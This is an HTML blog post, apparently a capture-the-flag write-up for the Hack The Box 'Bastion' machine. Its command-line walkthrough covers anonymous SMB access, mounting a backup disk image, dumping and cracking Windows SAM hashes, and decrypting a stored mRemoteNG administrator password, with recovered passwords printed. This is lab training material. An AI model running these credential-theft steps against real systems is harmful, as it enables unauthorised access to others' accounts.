@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bastion</title>
+<meta name="description" content="A blog">
+
+<link rel="stylesheet" href="//netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" type="text/css" media="all" href="/css/style.css" />
+<link rel="stylesheet" type="text/css" media="all" href="/css/jquery.mmenu.all.css" />
+<link rel="stylesheet" href="/css/highlightjs.piperita.css">
+
+<!-- Favicons generated at http://realfavicongenerator.net/ -->
+<link rel="apple-touch-icon" sizes="76x76" href="/favicons/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicons/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicons/favicon-16x16.png">
+<link rel="manifest" href="/favicons/site.webmanifest">
+<link rel="mask-icon" href="/favicons/safari-pinned-tab.svg" color="#5bbad5">
+<link rel="shortcut icon" href="/favicons/favicon.ico">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="msapplication-config" content="/favicons/browserconfig.xml">
+<meta name="theme-color" content="#ffffff">
+
+
+
+<!-- Go to www.addthis.com/dashboard to customize your tools -->
+<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-513c6fa83da6ec67"></script>
+
+
+
+
+</head>
+
+
+    <body>
+
+    <nav id="my-menu">
+  <div>
+    <p>phaz0n</p>
+
+    <ul class="pages">
+      <li><a href="/"><i class="fa fa-home"></i> Home</a></li>
+      <li><a href="/posts/"><i class="fa fa-archive"></i> All Posts</a></li>
+      <li><a href="/search/"><i class="fa fa-search"></i> Search</a></li>
+    </ul>
+
+    <p class="links">
+  <a href="https://www.twitter.com/_phaz0n" target="_new"><i class="fa fa-twitter"></i></a>
+  
+  
+  
+  
+  <a href="https://github.com/phaz0n" target="_new"><i class="fa fa-github-alt"></i></a>
+  
+  
+  
+  <a href="/feed.xml" target="_new"><i class="fa fa-rss"></i></a>
+</p>
+
+  </div>
+</nav>
+<div class="menu-button" href="#menu"><i class="fa fa-bars"></i></div>
+
+
+    <div class="page-content">
+      <div class="wrap">
+      
+
+<div class="container-fluid single">
+  <div class="row">
+
+    <div itemscope itemtype="http://schema.org/Article" class="col-md-12 article">
+      
+      <div class="thumb">
+        <i class="fa fa-flag fa-4x"></i>
+      </div>
+      
+
+      <h1 class="header" itemprop="name">Bastion</h1>
+
+      <div class="author">
+        <small><i>
+          
+          on <span itemprop="datePublished" content="2014-08-28">January 19, 2019</span>
+           under writeup
+        </i></small>
+      </div>
+
+      <div class="read-time">
+        <small>
+          7 minute read
+        </small>
+      </div>
+
+      <div class="content-panel content">
+
+        
+
+        <span itemprop="articleBody"><p><img src="/images/bastion/infocard.png" alt="" /></p>
+
+<h1 id="initial-scan">Initial Scan</h1>
+
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~/HTB/Bastion# nmap -sV -sC 10.10.10.134 -oA bastion.nmap                                                                 
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-22 08:26 EDT
+Nmap scan report for 10.10.10.134
+Host is up (0.053s latency).
+Not shown: 996 closed ports
+PORT    STATE SERVICE      VERSION
+22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
+|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
+|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -32m09s, deviation: 1h09m14s, median: 7m48s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: Bastion
+|   NetBIOS computer name: BASTION\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2019-09-22T14:34:30+02:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2019-09-22 08:34:28
+|_  start_date: 2019-09-22 08:32:24
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.66 seconds</code></pre></figure>
+
+<p>Not much to look into aside from SMB.</p>
+
+<h1 id="enumerating-smb">Enumerating SMB</h1>
+
+<p>It’s always worth testing to see if SMB permits null (aka anonymous) sessions. <strong>We need a share</strong> to try authenticating to first. So we list out the shares.</p>
+
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~/HTB/Bastion# smbclient -L \\10.10.10.134
+Enter WORKGROUP\root's password:
+    Sharename       Type      Comment                                                                                           
+    ---------       ----      -------                                                                                           
+    ADMIN$          Disk      Remote Admin                                                                                      
+    Backups         Disk                                                                                                        
+    C$              Disk      Default share                                                                                     
+    IPC$            IPC       Remote IPC 
+    </code></pre></figure>
+
+<p><code class="highlighter-rouge">ADMIN$</code>, <code class="highlighter-rouge">C$</code>, and <code class="highlighter-rouge">IPC$</code> are all default shares. <code class="highlighter-rouge">Backups</code> is the only one that stands out. I attempt to authenticate to it with no credentials.</p>
+
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~/HTB/Bastion# smbclient \\\\10.10.10.134\\Backups
+Enter WORKGROUP\root's password:
+Try "help" to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Tue Apr 16 06:02:11 2019
+  ..                                  D        0  Tue Apr 16 06:02:11 2019
+  note.txt                           AR      116  Tue Apr 16 06:10:09 2019
+  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
+  WindowsImageBackup                  D        0  Fri Feb 22 07:44:02 2019
+
+                7735807 blocks of size 4096. 2745314 blocks available</code></pre></figure>
+
+<p>Our null session worked. We have read access to the <code class="highlighter-rouge">Backups</code> share.</p>
+
+<p>Although there aren’t that many files in the share, some are massive. Here’s a quick look of the interesting directory <code class="highlighter-rouge">WindowsImageBackup</code>.</p>
+
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\&gt; dir
+  .                                   D        0  Fri Feb 22 07:45:32 2019                                                          
+  ..                                  D        0  Fri Feb 22 07:45:32 2019                                                          
+  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd      A 37761024  Fri Feb 22 07:44:03 2019                                                
+  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd      A 5418299392  Fri Feb 22 07:45:32 2019                                              
+  BackupSpecs.xml                     A     1186  Fri Feb 22 07:45:32 2019
+                                                            
+  &lt; . . . snip . . . &gt;</code></pre></figure>
+
+<p>VHD files? Definitely something to look at. But <code class="highlighter-rouge">5418299392</code> blocks? That’s over <em>two terabytes</em>. We need a way to enumerate the VHDs without downloading them entirely.</p>
+
+<h1 id="mounting-shares-and-vhd-files">Mounting shares and VHD files</h1>
+
+<p>If we mount the share, we can view it as if it were part of our own file system.</p>
+
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~/HTB/Bastion# mount -t cifs -o username=anonymous //10.10.10.134/Backups Backups
+Password for anonymous@//10.10.10.134/Backups:  </code></pre></figure>
+
+<p><img src="/images/bastion/image2.png" alt="" /></p>
+
+<p>Those juicy VHD files, though, aren’t readable this way. To browse through them, we have to mount those as well. For VHD files, we have to first install <code class="highlighter-rouge">guestmount</code>.</p>
+
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~/HTB/Bastion# apt-get install libguestfs-tools</code></pre></figure>
+
+<p>Then we create a new directory as the mountpoint.</p>
+
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~/HTB/Bastion# mkdir vhd1</code></pre></figure>
+
+<p>And we mount the VHD file.</p>
+
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~/HTB/Bastion# guestmount --add "/root/HTB/Bastion/Backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd" --inspector --ro /root/HTB/Bastion/vhd1 -v</code></pre></figure>
+
+<p>Now we can browse through the file system as if it were part of our own.</p>
+
+<p><img src="/images/bastion/image3.png" alt="" /></p>
+
+<p><em>Note: One of the VHD files wouldn’t mount properly. Turns out it isn’t necessary to mount anyway.</em></p>
+
+<p>Now with read access to the VHD, my first instinct is to go for the <strong>flags</strong>, but there’s nothing at <code class="highlighter-rouge">C:\Users\L4mpje\Desktop</code> or <code class="highlighter-rouge">C:\Users\Administrator\Desktop</code>. So we clearly don’t have the right access just yet.</p>
+
+<p>Next thing to do would be to search for <strong>user credentials</strong> (remember the open SSH port?). After we’ve checked for credentials lying around in obvious places, it makes sense to try accessing the SAM and SECURITY files.</p>
+
+<h1 id="sam-and-security">SAM and SECURITY</h1>
+
+<p>Depending on your version of Windows, these can be in a few different locations. Here, they’re in <code class="highlighter-rouge">C:\Windows\System32\config</code>.</p>
+
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~/HTB/Bastion/vhd1/Windows/System32/config# dir
+&lt; . . . snip . . . &gt;
+SAM
+SAM.LOG
+SAM.LOG1
+SAM.LOG2
+SECURITY
+&lt; . . . snip . . . &gt;</code></pre></figure>
+
+<p>I copy them from the mounted drive to my Kali box.</p>
+
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~/HTB/Bastion/vhd1/Windows/System32/config# cp SAM /root/HTB/Bastion
+root@kali:~/HTB/Bastion/vhd1/Windows/System32/config# cp SYSTEM /root/HTB/Bastion</code></pre></figure>
+
+<p>To get the hashes, I use <code class="highlighter-rouge">samdump2</code> and pass the <code class="highlighter-rouge">SYSTEM</code> and <code class="highlighter-rouge">SAM</code> files as arguments.</p>
+
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~/HTB/Bastion# samdump2 SYSTEM SAM -o hashes.txt
+root@kali:~/HTB/Bastion# cat hashes.txt
+*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::</code></pre></figure>
+
+<p>The L4mpje hash takes seconds to crack with <code class="highlighter-rouge">hashcat</code>.</p>
+
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~/HTB/Bastion# hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force</code></pre></figure>
+
+<p>The password for use L4mpje is <strong>bureaulampje</strong>. The Administrator and Guest account hashes are marked as <code class="highlighter-rouge">*disabled*</code>, so this is the best we’ll get.</p>
+
+<p><img src="/images/bastion/image4.png" alt="" /></p>
+
+<p>To get in, we <code class="highlighter-rouge">ssh</code> as <strong>L4mpje@10.10.10.134</strong> with the recovered password.</p>
+
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~# ssh L4mpje@10.10.10.134
+L4mpje@10.10.10.134's password: 
+
+Microsoft Windows [Version 10.0.14393]                                          
+(c) 2016 Microsoft Corporation. All rights reserved.                            
+
+l4mpje@BASTION C:\Users\L4mpje&gt;    </code></pre></figure>
+
+<p>The user flag is on L4mpje’s Desktop.</p>
+
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">l4mpje@BASTION C:\Users\L4mpje&gt;type Desktop\user.txt                            
+9bfe############################                                                   </code></pre></figure>
+
+<h1 id="privilege-escalation-mremoteng-credentials">Privilege Escalation: mRemoteNG Credentials</h1>
+
+<p>With Windows privilege escalation, if nothing stands out in the Users folder, I move on to checking what software is insatlled. Here, <code class="highlighter-rouge">mRemoteNG</code> stands out.</p>
+
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">l4mpje@BASTION C:\&gt;dir "Program Files (x86)"                                    
+ Volume in drive C has no label.                                                
+ Volume Serial Number is 0CB3-C487                                              
+
+ Directory of C:\Program Files (x86)                                            
+
+22-02-2019  15:01    &lt;DIR&gt;          .                                           
+22-02-2019  15:01    &lt;DIR&gt;          ..                                          
+16-07-2016  15:23    &lt;DIR&gt;          Common Files                                
+23-02-2019  10:38    &lt;DIR&gt;          Internet Explorer                           
+16-07-2016  15:23    &lt;DIR&gt;          Microsoft.NET                               
+22-02-2019  15:01    &lt;DIR&gt;          mRemoteNG                                   
+23-02-2019  11:22    &lt;DIR&gt;          Windows Defender                            
+23-02-2019  10:38    &lt;DIR&gt;          Windows Mail                                
+23-02-2019  11:22    &lt;DIR&gt;          Windows Media Player                        
+16-07-2016  15:23    &lt;DIR&gt;          Windows Multimedia Platform                 
+16-07-2016  15:23    &lt;DIR&gt;          Windows NT                                  
+23-02-2019  11:22    &lt;DIR&gt;          Windows Photo Viewer                        
+16-07-2016  15:23    &lt;DIR&gt;          Windows Portable Devices                    
+16-07-2016  15:23    &lt;DIR&gt;          WindowsPowerShell                           
+               0 File(s)              0 bytes                                   
+              14 Dir(s)  11.244.994.560 bytes free                              </code></pre></figure>
+
+<p>We can find the version number in the changelog file and look for a known exploit, but this doesn’t get us very far.</p>
+
+<p>A search for “mRemoteNG stored credentials”, however, results in <a href="http://hackersvanguard.com/mremoteng-insecure-password-storage/">exactly what we’re looking for</a>:</p>
+
+<blockquote>
+  <p>mRemoteNG uses insecure methods for password storage and can provide droves of valid credentials during an assessment or competition.</p>
+</blockquote>
+
+<p>As the post shows, we can find an encrypted password (right beside <strong>Username=”Administrator”</strong>) in C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.</p>
+
+<figure class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="nt">&lt;Node</span> <span class="na">Name=</span><span class="s">"DC"</span> <span class="na">Type=</span><span class="s">"Connection"</span> <span class="na">Descr=</span><span class="s">""</span> <span class="na">Icon=</span><span class="s">"mRemoteNG"</span> <span class="na">Panel=</span><span class="s">"General"</span> <span class="na">Id=</span><span class="s">"500e7d58-662a-44d4-aff0-3a4f547a3fee"</span> <span class="na">Username=</span><span class="s">"Administrator"</span> <span class="na">Domain=</span><span class="s">""</span> <span class="na">Password=</span><span class="s">"aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="</span> <span class="na">Hostname=</span><span class="s">"127.0.0.1"</span> <span class="na">Protocol=</span><span class="s">"RDP"</span> <span class="err">.</span> <span class="err">.</span> <span class="err">.</span> </code></pre></figure>
+
+<p>From here, you can find a handful of options available for decrypting an mRemoteNG password (including the one described in the previously linked-to <a href="http://hackersvanguard.com/mremoteng-insecure-password-storage/">blog post</a>).</p>
+
+<p>What worked best for me was <a href="https://github.com/haseebT/mRemoteNG-Decrypt">mRemoteNG_Decrypt.py</a>. I copied the encrypted password and passed it as a string to get the plaintext credential.</p>
+
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~/HTB/Bastion# python3 mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
+Password: thXLHM96BeKL0ER2</code></pre></figure>
+
+<p>From here, we simply have to SSH in as Administrator.</p>
+
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~# ssh Administrator@10.10.10.134
+Administrator@10.10.10.134's password: </code></pre></figure>
+
+<p>And the root flag is in Administrator’s Desktop folder.</p>
+
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">administrator@BASTION C:\Users\Administrator&gt; type Desktop\root.txt                                                             
+9588############################</code></pre></figure>
+</span>
+
+        
+
+        
+        <div class="share">
+          <!-- Go to www.addthis.com/dashboard to customize your tools -->
+          <div class="addthis_sharing_toolbox"></div>
+        </div>
+        
+
+        
+        <div class="tags">
+          <small>
+          <i class="fa fa-tags"></i>
+            hackthebox, writeup, walkthrough
+          </small>
+        </div>
+        
+
+      </div>
+
+    
+      
+
+      
+
+    </div>
+
+  </div>
+
+</div>
+
+
+
+      </div>
+    </div>
+
+    <div class="footer clearfix">
+  <div class="col-md-6">
+    Theme by <a href="https://twitter.com/_JacobTomlinson">Jacob Tomlinson</a>
+  </div>
+  <div class="col-md-6">
+    &lt;/&gt; on <a href="https://github.com/phaz0n">Github</a> &nbsp;<i class="fa fa-github-alt"></i>
+  </div>
+</div>
+
+<script src="//code.jquery.com/jquery-1.11.0.min.js"></script>
+<script src="//netdna.bootstrapcdn.com/bootstrap/3.1.1/js/bootstrap.min.js"></script>
+<script src="/js/jquery.mmenu.min.all.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+<script type="text/javascript">
+   $(document).ready(function() {
+      $("#my-menu").mmenu().on( "closed.mm", function() {
+            $(".menu-button").show();
+         });
+      $(".menu-button").click(function() {
+        $(".menu-button").hide();
+        $("#my-menu").trigger("open.mm");
+      });
+   });
+</script>
+
+
+
+
+
+
+    </body>
+</html>
